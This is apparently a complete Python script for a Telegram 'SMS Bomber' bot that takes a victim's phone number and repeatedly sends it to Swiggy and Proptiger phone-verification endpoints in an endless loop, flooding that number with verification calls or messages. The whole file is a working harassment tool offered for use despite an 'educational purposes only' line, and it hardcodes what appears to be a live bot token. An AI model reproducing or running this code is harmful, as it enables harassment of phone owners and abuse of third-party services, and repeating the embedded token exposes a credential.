import requests
import logging
import asyncio
import concurrent.futures
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot Token
TOKEN = "7554221154:AAF6slUuJGJ7tXuIDhEZP8LIOB5trSTz0gU"

# Global variables
active_attacks = {}
message_count = {}

# Working APIs
APIS = [
    {
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "payload": {"mobile": ""},
        "headers": {"Content-Type": "application/json"},
        "name": "Swiggy"
    },
    {
        "url": "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call",
        "payload": {"contactNumber": "", "domainId": "2"},
        "headers": {"Content-Type": "application/json"},
        "name": "Proptiger"
    }
]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /start command"""
    keyboard = [
        [InlineKeyboardButton("⚡ Start Attack", callback_data='start_attack')],
        [InlineKeyboardButton("ℹ️ Help", callback_data='help')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🌟 SMS Bomber Bot 🌟\n\n"
        "Click 'Start Attack' to begin.",
        reply_markup=reply_markup
    )

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()

    if query.data == 'start_attack':
        await query.edit_message_text(text="🔢 Please send the 10-digit phone number now")
        context.user_data['expecting_number'] = True
    elif query.data == 'help':
        await help_command(update, context)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show help information"""
    await update.message.reply_text(
        "📖 Help Guide:\n\n"
        "1. Click 'Start Attack'\n"
        "2. Send phone number when asked\n"
        "3. Use /stop to end attack\n\n"
        "⚠️ For educational purposes only!"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle incoming messages"""
    if context.user_data.get('expecting_number', False):
        phone_number = update.message.text.strip()
        
        if not phone_number.isdigit() or len(phone_number) != 10:
            await update.message.reply_text("❌ Invalid number. Please send 10 digits.")
            return
            
        context.user_data['expecting_number'] = False
        await start_attack(update, context, phone_number)

async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str) -> None:
    """Start the attack process"""
    user_id = update.effective_user.id
    
    if user_id in active_attacks:
        await update.message.reply_text("⚠️ You already have an active attack.")
        return
    
    active_attacks[user_id] = True
    message_count[user_id] = 0
    
    # Start attack in background
    asyncio.create_task(run_attack_async(update, context, phone_number, user_id))
    
    await update.message.reply_text(f"🚀 Attack started on {phone_number}")

async def run_attack_async(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str, user_id: int):
    """Run attack in an async task"""
    try:
        while active_attacks.get(user_id, False):
            with concurrent.futures.ThreadPoolExecutor() as executor:
                # Run synchronous API calls in threads
                futures = [
                    executor.submit(
                        send_api_request,
                        api,
                        phone_number
                    )
                    for api in APIS
                ]
                
                # Process results
                success = 0
                for future in concurrent.futures.as_completed(futures):
                    try:
                        if future.result():
                            success += 1
                    except Exception as e:
                        logger.error(f"API error: {e}")
                
                message_count[user_id] += success
                
                # Send update
                progress = min(100, message_count[user_id] * 10)
                progress_bar = "🟩" * (progress // 2) + "⬜" * (50 - progress // 2)
                
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=(
                        f"📊 Round complete\n"
                        f"✅ Success: {success}\n"
                        f"📨 Total: {message_count[user_id]}\n"
                        f"{progress_bar} {progress}%"
                    )
                )
                
                # Wait before next round
                for _ in range(35):
                    if not active_attacks.get(user_id, False):
                        return
                    await asyncio.sleep(1)
                    
    except Exception as e:
        logger.error(f"Attack error: {e}")
        if user_id in active_attacks:
            del active_attacks[user_id]
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"⚠️ Attack error: {str(e)}"
        )

def send_api_request(api: dict, phone_number: str) -> bool:
    """Synchronous API request function"""
    try:
        payload = api["payload"].copy()
        for key in payload:
            if "mobile" in key.lower() or "phone" in key.lower():
                payload[key] = phone_number
        
        response = requests.post(
            api["url"],
            json=payload,
            headers=api.get("headers", {}),
            timeout=10
        )
        return response.status_code == 200
    except Exception:
        return False

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Stop the attack"""
    user_id = update.effective_user.id
    if user_id in active_attacks:
        del active_attacks[user_id]
        total = message_count.get(user_id, 0)
        del message_count[user_id]
        await update.message.reply_text(f"🛑 Attack stopped\nTotal messages: {total}")
    else:
        await update.message.reply_text("ℹ️ No active attack to stop")

def main():
    """Start the bot"""
    application = Application.builder().token(TOKEN).build()
    
    # Register handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop_attack))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CallbackQueryHandler(button))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    application.run_polling()

if __name__ == '__main__':
    main()
